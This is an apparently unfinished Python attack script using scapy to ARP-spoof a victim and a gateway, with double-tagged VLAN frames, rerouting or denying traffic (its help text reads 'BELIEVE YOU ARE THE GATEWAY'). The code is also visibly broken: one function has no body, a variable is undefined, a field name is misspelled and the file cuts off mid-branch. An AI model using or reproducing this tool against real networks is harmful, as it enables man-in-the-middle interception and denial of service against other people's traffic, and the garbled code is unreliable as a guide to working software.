import sys, scapy, time, os, socket
from scapy import *
from argparse import ArgumentParser
from os import geteuid
from uuid import getnode as get_mac

def enable_forwarding():
	os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")

def disable_forwarding():
	os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")


#pdst = packet destination
#psrc = packet source
#hwdst = hardware destination
#hwsrc = your mac automatically (which allos you to recieve the packets)
def arp_spoof(target_ip, gateway_ip):

	target_pkt = ARP()
	target_pkt.op = 'is-at'
	target_pkt.pdst = target_ip
	target_pkt.psrc = gateway_mac
	target_pkt.hwdst = get_mac(target_ip)

	gateway_pkt = ARP()
	gateway_pkt.op = 'is-at'
	gateway_pkt.psrc = target_ip
	gateway_pkt.hwdst = get_mac(gateway_ip)
	gateway_pkt.psdt = gateway_ip


	print('[-] Sending arp packets. CTRL+C to exit')

	send( Ether(dst=get_mac(target_ip))/Dot1Q(vlan=1)/Dot1Q(vlan=2)
	/target_pkt,
	inter=RandNum(10,40), loop=1 )

	send( Ether(dst=get_mac(gateway_ip))/Dot1Q(vlan=1)/Dot1Q(vlan=2)
	/gateway_pkt,
	inter=RandNum(10,40), loop=1 )


def arp_dos(victimIp, gatewayIp):

#taken from blackhat
def get_mac(ip_address):
	response, unanswered = srp(Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst=ip_address), \
	  timeout=2, retry=10)
	for s, r in response:
	  return r[Ether].src
	return None

  return mac[0:17]
#calls function arp_monitor_callback
if __name__ == "__main__":

	if not geteuid() == 0:
		exit("[-] Rerun with root access")
		
	#enable_forwarding()
	parser = ArgumentParser(description = '[-] BELIEVE YOU ARE THE GATEWAY')
	parser.add_argument('-t', required=False, dest ='type', help= '[0] Traffic Re-Routed to Source Ip. [1] DOS. Default [0]')
	parser.add_argument('-v', '--victimIp', dest='victim', required=True, help= 'Set Victim Ip Address')
	parser.add_argument('-g', '--gatewayIp', dest='gateway', required=True,help= 'Set ip you want to impersonate')
	parser.add_argument('-f', dest='forward', required = False, help = '[1] Enable packet forwarding. Defaut: unenabled')

	args = parser.parse_args()

	if args.forward ==1:
		enable_forwarding()

	if args.type == 1:

		



